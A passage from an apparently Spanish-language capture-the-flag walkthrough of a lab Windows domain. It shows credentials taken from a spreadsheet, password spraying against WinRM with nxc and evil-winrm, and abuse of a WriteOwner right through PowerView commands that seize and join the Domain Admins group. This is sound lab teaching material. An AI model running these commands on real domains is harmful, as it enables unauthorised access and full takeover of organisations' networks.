libreoffice Engines.xls
```

<figure><img src="../../../.gitbook/assets/3158_vmware_VVZwXe9Xqv.png" alt=""><figcaption></figcaption></figure>

Al abrir el Excel descargado,verificamos que dispone de credenciales de diferentes sitios sobre la usuaria (maria@object.local).

<figure><img src="../../../.gitbook/assets/3159_vmware_PSu70iFsqG.png" alt=""><figcaption></figcaption></figure>

Guardaremos las credenciales en el archivo "passwords.txt".

<figure><img src="../../../.gitbook/assets/3160_vmware_ubjHmWhdDG.png" alt=""><figcaption></figcaption></figure>

Proabremos de validar si alguna de las credenciales obtenidas es válida para la usuaria, una vez verificado, procederemos a conectarnos al WinRM a través de _evil-winrm._

```bash
nxc winrm 10.10.11.132 -u 'maria' -p passwords.txt

evil-winrm -i 10.10.11.132 -u 'maria' -p 'W3llcr4ft3d_4cls'
```

<figure><img src="../../../.gitbook/assets/3162_vmware_nrmwg3rgmc.png" alt=""><figcaption></figcaption></figure>

### Abusing WriteOwner (Takeover Domain Admins Group)

Al volver a enumerar desde BloodHound, verificamos que el usuario que disponemos actualmente (maria@object.local) dispone de privilegios de _**WriteOwner**_ sobre el grupo (Domain Admins@object.local).

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Revisando la información proporcionada por BloodHound sobre el privilegio en cuestión, observamos que el permiso _**WriteOwner**_ sobre un grupo permite a un atacante modificar el propietario del mismo, lo que le otorga la capacidad de tomar control total sobre dicho grupo.

Al cambiar el propietario a su propia cuenta, el atacante podría manipular el grupo de diversas formas, como agregar o quitar miembros, modificar permisos o incluso utilizar el grupo para obtener privilegios más altos dentro del dominio.

<figure><img src="../../../.gitbook/assets/3164_vmware_W4tvF0hfT2.png" alt="" width="443"><figcaption></figcaption></figure>

Utilizamos el comando `Set-DomainObjectOwner` para transferir la propiedad del grupo a "maria", lo que nos permitió cambiar cualquier aspecto del grupo, incluidos sus miembros y permisos.

A continuación, utilizamos `Add-DomainObjectAcl` para otorgar a "maria" permisos completos sobre el grupo y, con Add-DomainGroupMember, la agregamos como miembro del grupo _Domain Admins_, asegurando su acceso a privilegios de administrador en el dominio.

Finalmente, verificamos la pertenencia de "maria" al grupo mediante el comando _net user /domain_, confirmando su escalada de privilegios y control completo sobre el dominio.

```powershell
Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'maria'

Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity maria -Rights All

Add-DomainGroupMember -Identity 'Domain Admins' -Members 'maria'

net user maria /domain
```

<figure><img src="../../../.gitbook/assets/3165_vmware_cHvp6TUHXW.png" alt=""><figcaption></figcaption></figure>

Volveremos a iniciar una nueva sesión de WinRM a través de _evil-winrm_ para que se apliquen los cambios en la nueva sesión.

Una vez ganado el acceso, verificaremos que podemos eumerar el contenido de la flag **root.txt.**

```bash
evil-winrm -i 10.10.11.132 -u 'maria' -p 'W3llcr4ft3d_4cls'
```

<figure><img src="../../../.gitbook/assets/3166_vmware_GHeWaiNZxd.png" alt=""><figcaption></figcaption></figure>
